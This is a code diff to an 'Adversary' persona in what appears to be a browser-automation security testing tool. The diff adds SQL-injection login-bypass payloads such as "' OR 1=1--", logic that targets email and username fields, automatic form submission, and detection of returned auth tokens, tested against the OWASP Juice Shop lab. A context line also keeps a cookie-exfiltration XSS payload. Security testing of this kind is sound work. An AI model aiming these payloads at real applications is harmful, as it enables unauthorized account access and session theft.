@@ -25,11 +25,108 @@ class AdversaryPersona(BasePersona):
         "javascript:void(fetch('/api/exfil?c='+document.cookie))",
     ]
 
+    # Classic SQL-injection authentication bypasses. Reserved specifically for fields
+    # that look like a login's email/username, instead of being mixed randomly into
+    # ADVERSARIAL_PAYLOADS — a login form is the single highest-value target on most
+    # apps, and this is the exact payload family that breaks it when aimed correctly
+    # (confirmed against OWASP Juice Shop: '... OR 1=1--' in the email field returns a
+    # 200 with a full admin JWT, no password needed).
+    AUTH_BYPASS_PAYLOADS = [
+        "' OR 1=1--",
+        "' OR '1'='1' --",
+        "' OR '1'='1",
+        "admin'--",
+        "' OR 1=1#",
+    ]
+
+    # Substrings in an input's id/name/autocomplete/placeholder that suggest it's a
+    # login's email or username field (type="email" is also checked separately).
+    _AUTH_FIELD_HINTS = ("email", "user", "login", "signin")
+
     def __init__(self):
         super().__init__(
             name="Adversary",
             description="Bypasses client-side disabled guards, tampers with hidden fields, and injects adversarial security payloads.",
         )
+
+    def _looks_like_auth_field(self, element) -> bool:
+        """True if an input looks like a login form's email/username field — the
+        highest-value target for the SQL-injection auth bypass payloads."""
+        try:
+            if (element.get_attribute("type") or "").lower() == "email":
+                return True
+            attrs = " ".join(filter(None, [
+                element.get_attribute("id"),
+                element.get_attribute("name"),
+                element.get_attribute("autocomplete"),
+                element.get_attribute("placeholder"),
+            ])).lower()
+            return any(hint in attrs for hint in self._AUTH_FIELD_HINTS)
+        except Exception:
+            return False
+
+    @staticmethod
+    def _find_submit_target(page: Page):
+        """Finds the most likely form-submit button, so a bypass payload just typed
+        into a field actually gets sent, instead of sitting there until some later,
+        unrelated random click happens to fire the form."""
+        for selector in (
+            "#loginButton",
+            "button[type='submit']:visible",
+            "input[type='submit']:visible",
+            "button:visible",
+        ):
+            try:
+                el = page.query_selector(selector)
+                if el:
+                    return el
+            except Exception:
+                continue
+        return None
+
+    def _submit_and_watch_for_bypass(self, page: Page, payload: str):
+        """Clicks the likely submit button right after an auth-bypass payload was
+        typed in, and watches the very next response for signs of a successful
+        authentication bypass (HTTP < 400 carrying a token/auth field) so a hit
+        shows up clearly in the log instead of being buried in the HAR."""
+        submit_btn = self._find_submit_target(page)
+        if not submit_btn:
+            return
+
+        hit = {"status": None}
+
+        def _watch(response):
+            try:
+                if hit["status"] is not None or response.request.method not in ("POST", "PUT"):
+                    return
+                if response.status >= 400:
+                    return
+                content_type = response.headers.get("content-type", "")
+                if "json" not in content_type:
+                    return
+                body = response.text()
+                if '"token"' in body or '"authentication"' in body:
+                    hit["status"] = response.status
+            except Exception:
+                pass
+
+        page.on("response", _watch)
+        try:
+            btn_text = (submit_btn.text_content() or "submit").strip()[:30]
+            self.log_action(f"Immediately submitting auth-bypass payload via '{btn_text}'")
+            submit_selector = self.resilient_selector(submit_btn)
+            submit_btn.click(timeout=800, no_wait_after=True, force=True)
+            if submit_selector:
+                self.record_step("click", selector=submit_selector, force=True)
+            page.wait_for_timeout(400)
+        finally:
+            page.remove_listener("response", _watch)
+
+        if hit["status"] is not None:
+            self.log_action(
+                f"🚨 POSSIBLE AUTHENTICATION BYPASS: submitting '{payload[:30]}' got back "
+                f"HTTP {hit['status']} with a token/authentication field in the response."
+            )
 
     def _force_enable_disabled_controls(self, page: Page) -> List[str]:
         """Strips disabled and aria-disabled attributes from DOM elements via JavaScript."""
@@ -92,11 +189,20 @@ class AdversaryPersona(BasePersona):
                     self.log_action(f"Bypassed client locks on {len(unlocked)} disabled controls: {', '.join(unlocked[:3])}")
                     self.record_step("force_enable_disabled")
 
-                # Vector 3: Inject adversarial security payloads into visible inputs
+                # Vector 3: Inject adversarial security payloads into visible inputs.
+                # Login-shaped fields (email/username) get the dedicated SQL-injection
+                # auth-bypass payloads and an immediate submit, instead of competing on
+                # equal footing with every other input for a random pick each cycle —
+                # a login form is the single highest-value target on most apps.
                 inputs = page.query_selector_all("input:visible:not([type='submit']):not([type='button']), textarea:visible")
                 if inputs:
-                    target_input = random.choice(inputs)
-                    payload = random.choice(self.ADVERSARIAL_PAYLOADS)
+                    auth_candidates = [el for el in inputs if self._looks_like_auth_field(el)]
+                    if auth_candidates:
+                        target_input = random.choice(auth_candidates)
+                        payload = random.choice(self.AUTH_BYPASS_PAYLOADS)
+                    else:
+                        target_input = random.choice(inputs)
+                        payload = random.choice(self.ADVERSARIAL_PAYLOADS)
                     input_id = target_input.get_attribute("id") or target_input.get_attribute("name") or "field"
 
                     self.log_action(f"Adversarial probe on '{input_id}' with payload: {payload[:35]}...")
@@ -105,6 +211,9 @@ class AdversaryPersona(BasePersona):
                     if selector:
                         self.record_step("fill", selector=selector, value=payload)
                     page.wait_for_timeout(100)
+
+                    if auth_candidates:
+                        self._submit_and_watch_for_bypass(page, payload)
 
                 # Vector 4: Forcibly click action buttons even if application tried to lock them
                 buttons = page.query_selector_all("button:visible, input[type='submit']:visible")
@@ -132,13 +241,19 @@ class AdversaryPersona(BasePersona):
         target_name = step.get("value") or step.get("text") or step.get("id") or selector
 
         if event_type == "input":
-            payload = random.choice(self.ADVERSARIAL_PAYLOADS)
-            self.log_action(f"Adversary: Mutating journey input '{target_name}' with payload: {payload[:30]}...")
             try:
                 el = page.query_selector(selector)
+            except Exception:
+                el = None
+            is_auth_field = el is not None and self._looks_like_auth_field(el)
+            payload = random.choice(self.AUTH_BYPASS_PAYLOADS) if is_auth_field else random.choice(self.ADVERSARIAL_PAYLOADS)
+            self.log_action(f"Adversary: Mutating journey input '{target_name}' with payload: {payload[:30]}...")
+            try:
                 if el:
                     el.fill(payload)
                     self.record_step("fill", selector=selector, value=payload)
+                    if is_auth_field:
+                        self._submit_and_watch_for_bypass(page, payload)
             except Exception:
                 pass
 
